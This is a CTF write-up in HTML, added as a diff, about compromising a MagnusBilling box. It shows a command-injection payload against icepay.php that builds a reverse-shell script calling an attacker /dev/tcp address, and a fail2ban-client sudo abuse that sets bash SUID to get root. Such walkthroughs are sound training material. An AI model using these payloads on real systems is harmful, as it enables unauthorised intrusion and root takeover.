@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>BILLING_BOX — CTF Write-up</title>
+<style>
+    body {
+        background-color: #000;
+        color: #fff;
+        font-family: monospace;
+        margin: 0;
+        padding: 0;
+        font-size: 18px;
+    }
+    .container {
+        max-width: 900px;
+        margin: 40px auto;
+        padding: 20px;
+    }
+    h1, h2 {
+        text-align: center;
+        letter-spacing: 2px;
+    }
+    h1 {
+        font-size: 2.5em;
+        margin-bottom: 10px;
+    }
+    h2 {
+        margin-top: 50px;
+        border-bottom: 1px solid #fff;
+        padding-bottom: 5px;
+    }
+    p {
+        line-height: 1.6;
+        margin: 15px 0;
+    }
+    strong {
+        color: #fff;
+        font-weight: bold;
+    }
+    code {
+        background-color: #111;
+        padding: 2px 6px;
+        border: 1px solid #333;
+    }
+    pre {
+        background-color: #111;
+        padding: 15px;
+        overflow-x: auto;
+        border: 1px solid #333;
+    }
+    .image {
+        text-align: center;
+        margin: 20px 0;
+        opacity: 0.7;
+    }
+    .footer {
+        text-align: center;
+        margin-top: 60px;
+        font-size: 0.9em;
+        opacity: 0.6;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<h1>BILLING_BOX</h1>
+
+<p>Hello folks, what’s up? Are you guys ready for one more write-up? This is the second one I’m posting here, so let’s get started!</p>
+
+<h2>RECONNAISSANCE</h2>
+
+<p>For this CTF challenge, as soon as I opened the page, I was greeted with something that, at first glance, looked like a CMS or something similar. Mostly because of the name and the overall style of the site.
+Turns out I wasn’t that wrong after all. </p>
+<img src="./images/evidence1.png" width="900" height="500"> 
+<br/>
+
+<p>I decided to check which technologies were running on the site using wappalyzer.
+Apache was there and the version looked fine, but one thing really caught my attention: ExtJS.
+
+This was a huge clue about what might be running behind the scenes.
+
+I also tried logging in using some default credentials:</p>
+
+<br/>
+<img src="./images/evidence2.png" width="900" height="500"> 
+
+<p>I also tried default credentials:</p>
+<pre>
+username: root
+password: magnus
+</pre>
+
+<p>No success.</p>
+
+<h2>SCANNING</h2>
+
+<p>Next, I started digging through the source code, looking for directories and any other useful clues.
+I also ran gobuster to enumerate directories, and I found the following results:</p>
+<img src="./images/evidence5.png" width="900" height="500"> 
+<br>
+
+<p>With this information in hand, I let my curiosity take over and did a quick Google search to answer my main question: 
+    <strong>this a CMS, or a proprietary application?</strong> 
+</p>
+<br>
+<img src="./images/evidence3.png" width="900" height="500"> 
+
+<p>My intuition was right.
+It wasn’t exactly a CMS — it was a CRM.
+
+I searched to see if there were any known exploits for it.</p>
+
+<img src="./images/evidence4.png" width="900" height="500"> 
+<p>And… gotcha!
+There were exploits available.
+
+At this point, all I needed to know was whether the exploit matched the version running on the server, or if I was going down the wrong path.
+
+After some research, I found more information about which versions were vulnerable. Then I noticed something interesting: the versions matched the technologies that Wappalyzer had already shown me earlier.
+
+For example, ExtJS 6.2.0.961 matched perfectly with  <a href="https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=34828" style="text-decoration: none; color: red">Broadcom's</a> 
+explanation of the CVE. </p>
+
+<img src="./images/evidence9.png" width="900" height="500"> 
+
+<h2>EXPLOITATION</h2>
+
+<p>Before blindly running an exploit, I wanted to understand how the vulnerability actually worked. My goal was to deal with it properly and maybe even exploit it manually — or at least understand how it could be abused using something simple like curl.
+
+From what I understood, the vulnerability exists in a library that allows an attacker to write arbitrary files on the system.
+
+So I tried testing it myself with requests like these:</p>
+<pre>
+http://magnusbilling/lib/icepay.php?democ=testfile; echo "#!/bin/bash" > /tmp/a.sh
+http://magnusbilling/lib/icepay.php?democ=testfile; echo "sh -i /dev/tcp/192.168.184.X/1337 0>&1" >> /tmp/a.sh
+http://magnusbilling/lib/icepay.php?democ=testfile; chmod 755 /tmp/a.sh
+http://magnusbilling/lib/icepay.php?democ=testfile; sh /tmp/a.sh
+</pre>
+
+<img src="./images/evidence_exp.png" width="900" height="500"> 
+<a href="https://www.exploit-db.com/exploits/52170" style="text-decoration: none; color: red;">ExploitDB's reference for the CVE</a>.
+
+<p>Didn’t work :/ </p>
+
+<img src="./images/evidence11.png" width="900" height="500"> 
+
+<p>At that point, I decided to stop fighting it and just install Metasploit to do the dirty work for me.
+Metasploit worked, but the shell was awful. So I got a proper reverse shell.</p>
+
+<img src="./images/exploited.png" width="900" height="500"> 
+<img src="./images/exploited_done.png" width="900" height="500"> 
+
+<p>User flag found at <code>/home/magnus</code>.</p>
+<img src="./images/privesc2.png" width="900" height="150"> 
+
+<h2>POST-EXPLOITATION</h2>
+<p>After getting the reverse connection, I upgraded my shell using the classic method:</p>
+<pre>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + Z
+stty raw -echo
+fg
+export TERM=xterm
+</pre>
+
+<img src="./images/privesc1.png" width="900" height="180">
+
+<h2>PRIVILEGE ESCALATION</h2>
+
+<p>I started with the basics:
+
+Bash history of the magnus user
+
+System version using uname -a
+
+Linux capabilities
+
+Sudo permissions
+
+And jackpot — my user could execute a binary as root, without a password.
+
+That’s basically everything you want in a CTF.
+
+Still, I saved this information for later and continued looking for other privilege escalation paths, just in case.
+
+I checked for horizontal privilege escalation, cron jobs, and interesting processes, but found nothing useful. The only thing that stood out was a Python process running as root.
+
+Then I decided to investigate Fail2Ban.
+
+I looked for ways to abuse it and found a blog post on <a src="https://juggernaut-sec.com/fail2ban-lpe/" style="color: red; text-decoration: none;">juggernaut-sec.com</a> describing a Fail2Ban privilege escalation technique.
+</p>
+
+<img src="./images/failtry.png" width="900" height="500">
+
+<p>In their case, they had write permissions to:</p>
+
+<pre>
+    /etc/fail2ban/action.d/iptables-multiport.conf
+</pre>
+
+<p>
+But my situation was different.
+I could only execute commands using fail2ban-client (with very limited permissions to write. Only read and execute some important configuration files).
+
+Even so, reading that post was crucial to understanding how Fail2Ban actually works.
+
+Later, I found a PoC on <a src="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/fail2ban-command/" style="color: red; text-decoration: none;">exploit-notes.hdks.org</a>, and this one matched my situation perfectly — same binary, very similar context.
+
+I used the following technique from their page:
+</p>
+
+<pre>
+# Get jail list
+sudo /usr/bin/fail2ban-client status
+
+# Choose one jail from the list
+sudo /usr/bin/fail2ban-client get <JAIL> actions
+
+# Create a new action
+sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
+
+# Set a malicious action
+sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"
+
+# Trigger the action
+sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5
+
+# Get root
+/bin/bash -p
+
+</pre>
+
+<p>What’s happening here is simple but powerful:
+Fail2Ban can execute commands (called actions) when certain events occur.
+
+Since I could run fail2ban-client as root, every change I made was applied with root privileges. By abusing this behavior, I managed to escalate privileges and pop a root shell.
+
+It worked.
+
+<strong>Pw0ned successfully.</strong></p>
+
+<img src="./images/pwoned.png" width="900" height="500">
+<img src="./images/PWONED.png" width="900" height="500">
+
+</div>
+</body>
+</html>
+
